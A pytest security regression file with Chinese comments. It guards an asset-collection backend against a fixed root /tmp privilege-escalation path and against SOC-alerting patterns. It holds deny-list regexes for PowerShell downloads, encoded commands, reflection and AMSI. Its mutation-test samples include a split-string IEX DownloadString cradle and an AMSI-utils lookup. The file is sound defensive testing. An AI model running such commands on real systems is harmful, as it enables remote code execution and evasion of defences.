"""agent_scripts 的資安迴歸守門。

## 為什麼要有這支

2026-08-28 修掉一個**真的本機提權漏洞**：root 排程去掃全域可寫的
`/tmp/webit3_agent_*`，把裡面上傳上來的 `push_agent.sh` 用 root 裝進 `/opt` 755、
排進持有全機隊 SSH 金鑰的帳號的 crontab。任何本機帳號都能照著這條路徑讓 root
幫他裝任意程式。詳見 `backend/agent_scripts/install.sh` 開頭與 README。

修好不等於修完——這種東西**會被改回去**：某天有人為了「方便測試」把投放目錄
改回 `/tmp`、或為了「支援自訂收集項目」讓 task_dir 又能帶腳本上來。這支測試就是
把那條線釘死，改回去就紅。

同一份精神也套用在 SOC 那組樣式（`CLAUDE.md` 天條）：`ExecutionPolicy Bypass`、
base64 混淆落地執行、`StrictHostKeyChecking=no`。那些不是風格問題，是會讓使用者
被 SOC 當成事件當事人去解釋的東西，所以一併釘住整個 `APP/` 樹。
"""
import re
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / "APP" / "asset-module" / "backend" / "agent_scripts"
APP = ROOT / "APP"


def _read(name: str) -> str:
    return (SCRIPTS / name).read_text(encoding="utf-8")


# --------------------------------------------------------------------------
# 一、提權漏洞本身
# --------------------------------------------------------------------------

@pytest.mark.parametrize("name", ["run_auto_web3.sh", "bootstrap_watcher.sh"])
def test_root_排程不得掃描全域可寫的_tmp(name):
    """root 撿 /tmp 底下的東西來處理 = 任何本機帳號都能餵它東西。

    只擋「拿 /tmp 當投放目錄」，不擋註解裡提到 /tmp——那些註解正是在說明
    為什麼不能這樣做，刪掉反而讓下一個人不知道這條線為什麼存在。
    """
    code = [ln for ln in _read(name).splitlines() if not ln.lstrip().startswith("#")]
    for ln in code:
        assert "/tmp/webit3" not in ln, f"{name} 又把投放目錄放回 /tmp：{ln.strip()}"
        assert "INCOMING_DIR" not in ln or "/tmp" not in ln, \
            f"{name} 的 INCOMING_DIR 指到 /tmp：{ln.strip()}"


@pytest.mark.parametrize("name", ["install.sh", "bootstrap_watcher.sh"])
def test_agent_程式碼不得取自投放目錄(name):
    """root 只執行隨佈署固定下來的程式碼，外部只能傳資料。"""
    src = _read(name)
    assert '"$TASK_DIR/push_agent.sh"' not in src, \
        f"{name} 又從投放目錄取得 push_agent.sh——那是可執行內容，不是資料"
    assert '$BIN_DIR/push_agent.sh' in src, \
        f"{name} 沒有從佈署路徑取得 push_agent.sh"


def test_投放目錄裡出現腳本要被當成攻擊跡象拒絕():
    src = _read("install.sh")
    assert "push_agent.sh)" in src, "install.sh 沒有針對 push_agent.sh 的拒絕分支"
    # 白名單而不是黑名單：只有這三個名字放行
    assert "agent_key|collector_url|.ready)" in src, \
        "install.sh 的檔名檢查不是白名單——黑名單擋不住沒想到的檔名"


def test_資料檔要驗格式不是只檢查存在():
    src = _read("install.sh")
    assert "[A-Za-z0-9_-]{16,128}" in src, "agent_key 沒有驗格式"
    assert "^https?://" in src, "collector_url 沒有驗格式"
    assert "-L " in src, "沒有擋 symlink——那是最基本的一步"


def test_投放目錄權限不對要整輪拒絕():
    """比對的是 case 的**分支條件**，不是訊息裡有沒有提到 root:730。

    第一版寫成 `assert "root:730" in src` 就漏抓了——那個字串在錯誤訊息裡也有一份，
    把分支條件放寬成 `*)` 之後測試照樣綠。守門測試自己也要被驗過會紅。
    """
    src = _read("run_auto_web3.sh")
    assert re.search(r"^\s*root:730(\|[a-z0-9:]+)*\)", src, re.M), \
        ("run_auto_web3.sh 沒有在掃描前檢查投放目錄權限是 root:730。"
         "前提壞了就不該挑幾個看起來沒問題的任務做")
    assert "INC_STAT" in src, "沒有真的去 stat 投放目錄"


# --------------------------------------------------------------------------
# 二、bootstrap 是產生物，必須跟正本同步
# --------------------------------------------------------------------------

def test_bootstrap_與正本同步():
    """同一段程式碼存在兩份 → 只改一份的話 git diff 看起來修好了，
    實際佈到主機上的還是舊版。「看起來修好、實際沒修」比沒修更危險。
    """
    r = subprocess.run([sys.executable, str(SCRIPTS / "build_bootstrap.py"), "--check"],
                       capture_output=True, text=True, encoding="utf-8")
    assert r.returncode == 0, (
        f"bootstrap_watcher.sh 與正本不同步，請跑："
        f"python {SCRIPTS / 'build_bootstrap.py'}\n{r.stdout}{r.stderr}")


def test_bootstrap_必須是_LF():
    """這份要在 Linux/AIX 上跑；CRLF 會讓 `#!/bin/sh` 直接壞掉，
    而且錯誤訊息（`: 未預期的...`）完全看不出原因。"""
    assert b"\r\n" not in (SCRIPTS / "bootstrap_watcher.sh").read_bytes()


# --------------------------------------------------------------------------
# 三、SOC 樣式（CLAUDE.md 天條）——釘住整個 APP/ 樹
# --------------------------------------------------------------------------

#: 樣式 → 為什麼禁（訊息會直接印給改壞的人看，所以要寫出替代做法）
FORBIDDEN = {
    "StrictHostKeyChecking=no":
        "關掉主機金鑰驗證＝自願接受中間人攻擊，稽核必開缺失。"
        "改用 onboard_engine.SSH_HOSTKEY_OPTS（accept-new ＋ 明確的 known_hosts）",
    "ExecutionPolicy Bypass":
        "字面上就是 Bypass，對應 MITRE T1562.001 削弱防禦。"
        "腳本走 stdin（powershell -NoProfile -NonInteractive -Command -）不受執行原則約束，"
        "本來就不需要這個旗標",
    "| base64 -d":
        "base64 混淆後餵給 shell 是 T1027+T1059.001，勒索軟體投放的標準動作。"
        "腳本走 stdin 送純文字，可讀可稽核",
    "openssl base64 -d":
        "同上（AIX 版本）",
}

SKIP_DIRS = {"node_modules", ".nuxt", ".output", "dist", "__pycache__", ".venv"}
SCAN_EXT = {".py", ".sh", ".ps1", ".vue", ".ts", ".js", ".yml", ".yaml"}


def _scan_files():
    for p in APP.rglob("*"):
        if p.suffix not in SCAN_EXT or not p.is_file():
            continue
        if SKIP_DIRS & set(p.parts):
            continue
        yield p


def _code_hits(path: Path, pattern: str) -> list[str]:
    """找出 `pattern` 出現在**實際執行的程式碼**裡的位置。

    註解與 docstring 裡提到這些樣式，通常正是在解釋「為什麼不能這樣寫」——
    那是資產不是缺失，砍掉只會讓下一個人不知道這條線為什麼存在。
    但**一般字串**要算：真正的違規長得就是 `"-o", "StrictHostKeyChecking=no"`，
    整段掠過字串等於這條規則什麼都抓不到。

    .py 用 tokenize 精確分辨 docstring（獨立成一句的字串）與參數字串；
    其他副檔名沒有可靠的 parser，退回逐行看註解前綴。
    """
    text = path.read_text(encoding="utf-8", errors="replace")
    lines = text.splitlines()

    if path.suffix == ".py":
        import io as _io
        import token as _tok
        import tokenize as _tokenize

        hits, prev = [], _tok.NEWLINE
        try:
            for t in _tokenize.generate_tokens(_io.StringIO(text).readline):
                if t.type in (_tok.COMMENT, _tok.NL, _tok.NEWLINE,
                              _tok.INDENT, _tok.DEDENT):
                    if t.type != _tok.COMMENT:
                        prev = t.type
                    continue
                is_docstring = (t.type == _tok.STRING and
                                prev in (_tok.NEWLINE, _tok.INDENT, _tok.DEDENT))
                if not is_docstring and pattern in t.string:
                    hits.append(f"{path.relative_to(ROOT)}:{t.start[0]}: "
                                f"{lines[t.start[0] - 1].strip()}")
                prev = t.type
            return hits
        except (_tokenize.TokenError, IndentationError, SyntaxError):
            pass    # 解析不了就退回逐行，寧可誤報也不要漏報

    return [f"{path.relative_to(ROOT)}:{i}: {ln.strip()}"
            for i, ln in enumerate(lines, 1)
            if pattern in ln and not ln.lstrip().startswith(("#", "//", "*", "·"))]


@pytest.mark.parametrize("pattern", sorted(FORBIDDEN))
def test_不得出現_SOC_告警樣式(pattern):
    hits = [h for p in _scan_files() for h in _code_hits(p, pattern)]
    assert not hits, (
        f"出現禁止樣式 `{pattern}`——{FORBIDDEN[pattern]}\n" + "\n".join(hits))


# --------------------------------------------------------------------------
# 四、Windows 收集送出去的 PowerShell（2026-10-20 公司 SOC 事件後）
# --------------------------------------------------------------------------
# 事件：有人手動跑官方 FCB 稽核工具（powershell.exe 帶「略過執行原則」與 File 參數、腳本放在
# Windows\Temp）→ SOC 開單「嘗試繞過 PowerShell 執行原則的攻擊」。不是我們的系統，
# 但我們送到上百台 Windows 的每一段 PowerShell 都不可以長得像那樣。
# 規則（協調者硬規則）：只走 PSRP 在記憶體跑 script block／cmdlet——不帶執行原則參數、不寫 .ps1、
# 不帶 File 參數、不送編碼指令、不 Invoke-Expression、不下載、不載入組件、不碰反射與 AMSI。
# 上面第三節是掃整棵 APP/ 的字面樣式；這一節是**實際組出來的腳本內容**（含 f-string 組出來的），
# 而且不分大小寫——SOC 的偵測規則不分大小寫。

sys.path.insert(0, str(ROOT / "APP" / "asset-module" / "backend"))

#: Windows 組態檢核送出去的整段 payload 在守門清單裡的名字
FCB_PAYLOAD = "win_fcb.payload"

#: (樣式, 為什麼禁)。不分大小寫。
WIN_FORBIDDEN = [
    (r"-ExecutionPolicy\b|(?<![\w-])-ep\s+\w|\bBypass\b", "改執行原則／Bypass（MITRE T1562.001）"),
    (r"-EncodedCommand\b|(?<![\w-])-enc\b|(?<![\w-])-ec\b|(?<![\w-])-e\s+[A-Za-z0-9+/=]{16,}",
     "編碼指令（T1027）"),
    (r"FromBase64String|ToBase64String|\bbase64\b", "base64 混淆（T1027）"),
    (r"(?<![\w-])-File\b", "以 -File 執行落地腳本"),
    (r"\.ps1\b", "落地 .ps1 腳本"),
    (r"Invoke-Expression|\biex\b", "Invoke-Expression（T1059.001 典型樣式）"),
    (r"DownloadString|DownloadFile|Net\.WebClient|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|"
     r"Start-BitsTransfer|\bcurl\b|\bwget\b", "下載（T1105）"),
    (r"Add-Type", "Add-Type 載入／編譯組件"),
    (r"Reflection\.|\[Reflection|GetMethod\(|GetField\(|\.InvokeMember\(", "反射"),
    (r"amsi", "AMSI 相關字樣"),
    (r"Set-MpPreference|Add-MpPreference", "改 Defender 設定"),
    (r"Start-Process|\bInvoke-Command\b|\bNew-PSSession\b", "另起行程／再跳一層遠端"),
]

#: 收集（唯讀）腳本另外不准寫任何檔案、改設定、動服務
WRITE_FORBIDDEN = [
    (r"Out-File|Set-Content|Add-Content|New-Item|Copy-Item|Move-Item|Remove-Item|WriteAll|"
     r"Export-|Tee-Object|Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|Set-Service|"
     r"Stop-Service|Start-Service|Restart-Service", "收集腳本只能讀，不可寫檔／改設定／動服務"),
]


def _win_payloads() -> dict:
    """{名稱: (腳本內容, 是不是唯讀收集腳本)}。

    winrm_collector／software_collector 裡**所有**名字結尾是 _PS 的字串常數自動納入——
    以後新增一段 Windows 收集腳本，不用記得來這裡登記也會被守到。
    """
    import facts_collector
    import onboard_engine
    import schedule_inventory
    import service_collector
    import software_collector
    import win_fcb
    import win_host_spec
    import win_rebuild_collector
    import winrm_collector

    out: dict = {}
    for mod in (winrm_collector, software_collector, win_rebuild_collector, schedule_inventory,
                win_host_spec):
        for name in dir(mod):
            val = getattr(mod, name)
            if (name.endswith("_PS") or name == "_PS_ERR_FN") and isinstance(val, str):
                out[f"{mod.__name__}.{name}"] = (val, True)
    for mod in (service_collector, facts_collector):
        for k, v in mod.WINDOWS_CMDS.items():
            out[f"{mod.__name__}.WINDOWS_CMDS[{k}]"] = (v, True)
    # 納管腳本（舊的 OpenSSH 路線，人手動在目標機跑）會建帳號、寫金鑰——不套唯讀規則，但 SOC 規則照套
    out["onboard_engine.build_windows_script"] = (
        onboard_engine.build_windows_script("ssh-ed25519 AAAATESTKEY test", "10.99.0.1"), False)
    out["onboard_engine.ESXI_SCRIPT_GUARD_PS"] = (onboard_engine.ESXI_SCRIPT_GUARD_PS, True)
    # Windows 組態檢核（公司基準 286 條，2026-10-21 方案 B）：實際送出去的整段（包裝層＋腳本本體）。
    # 會寫暫存檔（結果 TXT、secedit 匯出）所以不套唯讀規則，SOC 規則照套；子行程另有專屬守門（第五節）
    out[FCB_PAYLOAD] = (win_fcb.build_payload(win_fcb.latest_script().read_text(encoding="utf-8-sig")),
                        False)
    return out


def _win_hits(text: str, rules) -> list:
    hits = []
    for pat, why in rules:
        for m in re.finditer(pat, text, flags=re.IGNORECASE):
            line = text[:m.start()].count("\n") + 1
            hits.append(f"第 {line} 行 `{m.group(0)}`：{why}")
    return hits


def test_windows_payload_清單有涵蓋到每一段收集腳本():
    names = set(_win_payloads())
    for must in ("winrm_collector.FACTS_PS", "winrm_collector.SERVICES_PS",
                 "winrm_collector.HEALTH_PS", "winrm_collector.ACCOUNTS_PS",
                 "software_collector.WINDOWS_PS", "onboard_engine.build_windows_script",
                 FCB_PAYLOAD, "win_rebuild_collector.REBUILD_PS",
                 "schedule_inventory.SCHEDULE_PS", "win_host_spec.WIN_SPEC_PS"):
        assert must in names, f"{must} 沒有被 SOC 守門掃到"


@pytest.mark.parametrize("name", sorted(_win_payloads()))
def test_windows_payload_不得出現_SOC_告警樣式(name):
    text, read_only = _win_payloads()[name]
    hits = _win_hits(text, WIN_FORBIDDEN + (WRITE_FORBIDDEN if read_only else []))
    assert not hits, f"{name} 出現 SOC／唯讀禁止樣式：\n" + "\n".join(hits)


@pytest.mark.parametrize("bad", [
    "powershell.exe -NoProfile -" + "ExecutionPolicy By" + "pass -Fi" + "le C:\\Windows\\Temp\\a.p" + "s1",
    "powershell -ep by" + "pass -c x",
    "powershell -Encoded" + "Command SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
    "powershell -en" + "c SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
    "IE" + "X (New-Object Net.WebClient).Download" + "String('http://x')",
    "invoke-exp" + "ression $s",
    "[System.Convert]::FromBase" + "64String($b)",
    "Add-Ty" + "pe -TypeDefinition $src",
    "[Reflec" + "tion.Assembly]::Load($b)",
    "[Ref].Assembly.GetType('System.Management.Automation.Am" + "siUtils')",
    "Set-Content -Path $env:TEMP\\x.p" + "s1 -Value $s",
])
def test_守門本身抓得到已知壞樣式(bad):
    """突變測試的常駐版：守門規則自己要會紅（規則被改鬆就在這裡被抓到）。
    樣本字串刻意拆開拼接，免得這支測試檔本身被第三節的全樹掃描當成違規。"""
    assert _win_hits(bad, WIN_FORBIDDEN + WRITE_FORBIDDEN), f"守門漏抓：{bad}"


# --------------------------------------------------------------------------
# 五、收集腳本不在目標機起子行程（2026-10-20 協調決策，SOC 敏感）
# --------------------------------------------------------------------------
# net.exe／auditpol／secedit／whoami／sc.exe／reg.exe／wmic／w32tm… 由 wsmprovhost 起子行程，
# 是 EDR 常見偵測樣式（例：net accounts＝T1201 密碼原則探測）。PSRP 收集一律用行程內的
# CIM／登錄／cmdlet。
# 唯一例外（2026-10-21 使用者選方案 B，已知 SOC 看得到）：Windows 組態檢核（公司基準 286 條）
# 只准起 secedit 與 auditpol 兩個——其他任何執行檔一樣紅（見 test_組態檢核_只准起_secedit_auditpol）。
SPAWN_EXE = re.compile(
    r"(?:^|[\s(|;{=&])(net|net1|auditpol|secedit|whoami|sc|reg|wmic|w32tm|netsh|cmd|powershell|pwsh|"
    r"icacls|systeminfo|ipconfig|netstat|tasklist|quser|gpresult|nltest|dsquery|certutil|bitsadmin)"
    r"(?:\.exe)?(?=[\s)]|$)", re.IGNORECASE | re.MULTILINE)
#: 名稱 → 允許的子行程
SPAWN_ALLOW = {FCB_PAYLOAD: {"secedit", "auditpol"}}


def test_預設送出的Windows收集腳本_不起任何子行程():
    bad = []
    for name, (text, read_only) in _win_payloads().items():
        if not read_only or "WINDOWS_CMDS" in name:
            continue        # 納管腳本（人手動跑）與舊 SSH 路線（本身就是 powershell 指令）不在此列
        allow = SPAWN_ALLOW.get(name, set())
        for m in SPAWN_EXE.finditer(text):
            if m.group(1).lower() not in allow:
                bad.append(f"{name} 第 {text[:m.start()].count(chr(10)) + 1} 行：{m.group(1)}")
    assert not bad, "收集腳本起了子行程（改用 CIM／登錄／cmdlet）：\n" + "\n".join(bad)


def _ps_code_only(text: str) -> str:
    """PowerShell 文字 → 只留「會執行的程式碼」：註解（# 與 <# #>）、單引號字串、雙引號字串的
    純文字部分換成空白；雙引號字串裡的 $( … ) 子運算式**保留**（那裡面的指令會執行）。
    用途：組態檢核腳本的條目名稱裡有「Windows PowerShell」這類字樣，那不是在起行程。
    換行保留，行號不變。"""
    out = []
    i, n = 0, len(text)
    stack = ["code"]          # code / dq（雙引號字串）；dq 裡遇到 $( 推回 code，配對的 ) 再彈出
    depth = [0]               # 每一層 code 的括號深度
    while i < n:
        ch = text[i]
        mode = stack[-1]
        if mode == "code":
            if text.startswith("<#", i):
                j = text.find("#>", i + 2)
                j = n if j < 0 else j + 2
                out.append(re.sub(r"[^\n]", " ", text[i:j])); i = j; continue
            if ch == "#":
                j = text.find("\n", i)
                j = n if j < 0 else j
                out.append(" " * (j - i)); i = j; continue
            if ch == "'":
                j = i + 1
                while j < n:
                    if text[j] == "'" and j + 1 < n and text[j + 1] == "'":
                        j += 2; continue
                    if text[j] == "'":
                        break
                    j += 1
                out.append("'" + re.sub(r"[^\n]", " ", text[i + 1:j]) + "'"); i = j + 1; continue
            if ch == '"':
                stack.append("dq"); out.append('"'); i += 1; continue
            if ch == "(":
                depth[-1] += 1
            elif ch == ")":
                if depth[-1] == 0 and len(stack) > 1:
                    stack.pop(); depth.pop(); out.append(")"); i += 1; continue
                depth[-1] -= 1
            out.append(ch); i += 1; continue
        # dq
        if ch == "`" and i + 1 < n:
            out.append("  "); i += 2; continue
        if ch == '"':
            if i + 1 < n and text[i + 1] == '"':
                out.append("  "); i += 2; continue
            stack.pop(); out.append('"'); i += 1; continue
        if text.startswith("$(", i):
            stack.append("code"); depth.append(0); out.append("$("); i += 2; continue
        out.append("\n" if ch == "\n" else " "); i += 1
    return "".join(out)


def _spawned(text: str) -> list[tuple[int, str]]:
    code = _ps_code_only(text)
    return [(code[:m.start()].count("\n") + 1, m.group(1).lower()) for m in SPAWN_EXE.finditer(code)]


#: 呼叫運算子 `&` 後面可以接的東西：script block、腳本自己的跳脫函式 $E、兩個允許的執行檔。
#: 其餘（`& 'net' …`、`& "x.exe"`、`& $p`）一律紅——名稱藏在字串或變數裡，上面的字面掃描看不到。
_CALL_OK = re.compile(r"^(?:\{|\$E\b|secedit\b|auditpol\b)", re.IGNORECASE)
_CALL_OP = re.compile(r"(?:^|[\s(;{=|])&(?!&)\s*(\S+)", re.MULTILINE)


def _dynamic_calls(text: str) -> list[tuple[int, str]]:
    code = _ps_code_only(text)
    return [(code[:m.start()].count("\n") + 1, m.group(1)) for m in _CALL_OP.finditer(code)
            if not _CALL_OK.match(m.group(1))]


def test_組態檢核_只准起_secedit_auditpol():
    """方案 B 的例外要窄：只有這一段、只有這兩個執行檔；兩個都要真的在（守門有在看）。"""
    text, _ = _win_payloads()[FCB_PAYLOAD]
    assert not _dynamic_calls(text), _dynamic_calls(text)
    got = _spawned(text)
    bad = [f"第 {ln} 行：{exe}" for ln, exe in got if exe not in SPAWN_ALLOW[FCB_PAYLOAD]]
    assert not bad, "Windows 組態檢核起了 secedit／auditpol 以外的子行程：\n" + "\n".join(bad)
    assert {exe for _, exe in got} == {"secedit", "auditpol"}


@pytest.mark.parametrize("extra", ["$x = net accounts", "$y = (whoami /all)", "& reg query HKLM\\X",
                                   '"$(sc.exe query)"', "cmd /c dir"])
def test_組態檢核守門_塞進別的子行程會紅(extra):
    """突變：在腳本本體裡多塞一行別的執行檔，守門一定要抓到（含藏在雙引號 $( ) 裡的）。"""
    import win_fcb

    body = win_fcb.latest_script().read_text(encoding="utf-8-sig")
    mutated = win_fcb.build_payload(body.replace("$ScriptVersion =", extra + "\n$ScriptVersion =", 1))
    assert any(exe not in SPAWN_ALLOW[FCB_PAYLOAD] for _, exe in _spawned(mutated)), extra


@pytest.mark.parametrize("extra", ["& 'net' accounts", '& "net.exe" accounts', "$p = 'whoami'; & $p",
                                   '$x = "$(& \'reg\' query HKLM)"'])
def test_組態檢核守門_名稱藏在字串或變數裡也會紅(extra):
    import win_fcb

    body = win_fcb.latest_script().read_text(encoding="utf-8-sig")
    mutated = win_fcb.build_payload(body.replace("$ScriptVersion =", extra + "\n$ScriptVersion =", 1))
    assert _dynamic_calls(mutated), extra


def test_程式碼過濾_字串與註解裡的字樣不算_子運算式算():
    assert _spawned("Name = 'Windows PowerShell 轉譯'") == []
    assert _spawned('Write-Host "[*] 匯出 (secedit)..."') == []
    assert _spawned("# net accounts") == []
    assert [e for _, e in _spawned('"x $(net accounts) y"')] == ["net"]
    assert [e for _, e in _spawned("& secedit /export")] == ["secedit"]


@pytest.mark.parametrize("bad", ["$x = net accounts", "(whoami /all)", "auditpol /get /category:*",
                                 "secedit /export /cfg x", "sc.exe query", "reg query HKLM",
                                 "w32tm /query /source", "wmic os get caption"])
def test_子行程守門本身抓得到(bad):
    assert SPAWN_EXE.search(bad), bad
